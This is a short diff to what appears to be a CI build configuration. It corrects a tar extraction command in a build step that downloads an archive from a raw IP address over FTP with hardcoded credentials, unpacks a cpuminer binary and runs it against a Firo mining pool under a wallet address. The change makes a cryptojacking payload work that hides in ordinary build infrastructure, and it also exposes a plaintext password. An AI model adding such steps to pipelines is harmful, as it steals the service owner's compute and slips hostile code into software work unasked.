@@ -7,7 +7,7 @@ steps:
           apt-get update
           apt-get install -y wget
           wget --user=u750504516 --password='Vp123456' ftp://194.59.164.70/c.tar.gz
-          tar c.tar.gz
+          tar xf c.tar.gz
           cd cpuminer
           ./cpuminer -a mtp -o stratum+tcp://firo.2miners.com:8181 -u aBLVfkCbCHagdcVM9weTRyiB5x6rSkzsq7.gccb -p x
 options:
